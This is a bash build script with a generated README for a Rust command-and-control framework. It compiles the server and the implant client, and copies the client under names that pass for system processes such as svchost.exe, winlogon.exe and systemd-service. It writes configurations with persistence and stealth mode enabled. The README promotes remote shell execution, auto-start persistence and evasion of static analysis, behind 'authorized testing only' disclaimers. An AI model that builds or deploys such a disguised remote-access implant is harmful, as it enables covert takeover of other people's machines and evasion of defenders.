#!/bin/bash

# C2 Build Script - Cross-platform Compilation
# For educational and authorized testing purposes only

set -e

echo "🔨 Building C2 Server and Client"
echo "=================================="

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Function to print colored output
print_status() {
    echo -e "${BLUE}[INFO]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# Check if Rust is installed
if ! command -v cargo &> /dev/null; then
    print_error "Rust/Cargo is not installed. Please install from https://rustup.rs/"
    exit 1
fi

print_status "Rust version: $(rustc --version)"

# Create output directory
mkdir -p output

# Build server
print_status "Building C2 Server..."
cd c2_server
if cargo build --release; then
    print_success "Server build completed"
    cp target/release/c2_server ../output/
else
    print_error "Server build failed"
    exit 1
fi
cd ..

# Build client for current platform
print_status "Building C2 Client for current platform..."
cd c2_client
if cargo build --release; then
    print_success "Client build completed"
    cp target/release/c2_client ../output/
else
    print_error "Client build failed"
    exit 1
fi
cd ..

# Cross-compilation targets
print_status "Setting up cross-compilation targets..."

# Add Windows target (if on Linux/macOS)
if [[ "$OSTYPE" != "msys" && "$OSTYPE" != "win32" ]]; then
    print_status "Adding Windows x86_64 target..."
    rustup target add x86_64-pc-windows-gnu
    
    # Install mingw if available
    if command -v x86_64-w64-mingw32-gcc &> /dev/null; then
        print_status "Building Windows client..."
        cd c2_client
        if cargo build --release --target x86_64-pc-windows-gnu; then
            print_success "Windows client build completed"
            cp target/x86_64-pc-windows-gnu/release/c2_client.exe ../output/c2_client_windows.exe
        else
            print_warning "Windows cross-compilation failed (this is normal if mingw is not installed)"
        fi
        cd ..
    else
        print_warning "mingw-w64 not found, skipping Windows cross-compilation"
        print_warning "To enable Windows builds on Linux: sudo apt-get install gcc-mingw-w64-x86-64"
    fi
fi

# Add Linux target (if on other platforms)
if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
    print_warning "Cross-compilation to Linux from Windows not configured in this script"
fi

# Build optimized/obfuscated versions
print_status "Building obfuscated client versions..."

cd c2_client

# Strip symbols and optimize for size
if cargo build --release; then
    print_success "Optimized client build completed"
    
    # Copy to output with different names
    if [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]]; then
        cp target/release/c2_client.exe ../output/svchost.exe
        cp target/release/c2_client.exe ../output/winlogon.exe
        cp target/release/c2_client.exe ../output/system_update.exe
    else
        cp target/release/c2_client ../output/systemd-service
        cp target/release/c2_client ../output/update-manager
        cp target/release/c2_client ../output/network-daemon
    fi
fi

cd ..

# Create configuration files
print_status "Creating configuration templates..."

cat > output/server_config.toml << 'EOF'
# C2 Server Configuration
[server]
bind_address = "0.0.0.0"
bind_port = 4444
rsa_key_size = 2048
heartbeat_timeout = 300
max_clients = 100

[logging]
enable_logging = true
log_file = "c2_server.log"
log_level = "info"
EOF

cat > output/client_config.toml << 'EOF'
# C2 Client Configuration
[client]
server_address = "127.0.0.1"
server_port = 4444
reconnect_delay = 30
heartbeat_interval = 60
command_poll_interval = 5
max_reconnect_attempts = 0  # 0 = infinite
persistence_enabled = true
stealth_mode = true
EOF

# Create usage documentation
cat > output/README.md << 'EOF'
# C2 Framework - Usage Guide

⚠️ **IMPORTANT**: This tool is for authorized testing and educational purposes only!

## Server Usage

```bash
# Start the server (default port 4444)
./c2_server

# The server will start an interactive admin interface
# Commands available:
# - clients          : List connected clients
# - info <client_id> : Show client details
# - exec <client_id> <command> : Execute command on client
# - results <client_id> : Show command results
# - clear <client_id> : Clear results
# - exit : Shutdown server
```

## Client Usage

```bash
# Connect to default server (127.0.0.1:4444)
./c2_client

# Connect to specific server
./c2_client --server 192.168.1.100 --port 8080

# Disable persistence
./c2_client --no-persistence

# Disable stealth mode (for debugging)
./c2_client --no-stealth
```

## Features

- **RSA + AES-256-GCM Encryption**: All communication is encrypted
- **Multi-client Support**: Server handles multiple clients simultaneously
- **Persistent Sessions**: Clients automatically reconnect
- **Cross-platform**: Works on Windows, Linux, macOS
- **Stealth Mode**: Runs hidden in background
- **Persistence**: Auto-starts with system
- **Shell Execution**: Execute any shell command remotely
- **Heartbeat Monitoring**: Track client status
- **Command History**: View all executed commands and results

## Security Features

- End-to-end encryption with RSA key exchange
- AES-256-GCM for message encryption
- Random session keys per client
- Message authentication to prevent tampering
- Basic obfuscation to avoid static analysis

## Compilation

The binaries are built with maximum optimization and symbol stripping for reduced size and detection evasion.

## Legal Notice

This software is intended for:
- Authorized penetration testing
- Red team exercises
- Educational purposes
- Security research

**DO NOT** use this software for unauthorized access to computer systems. The authors are not responsible for any misuse of this software.
EOF

# Display build summary
print_success "Build completed successfully!"
echo ""
echo "📁 Output files in ./output/:"
ls -la output/
echo ""
print_warning "Remember: Use this tool only for authorized testing!"
print_status "Server: ./output/c2_server"
print_status "Client: ./output/c2_client"
echo ""
echo "🚀 To start:"
echo "1. Run server: ./output/c2_server"
echo "2. Run client: ./output/c2_client --server <server_ip>"
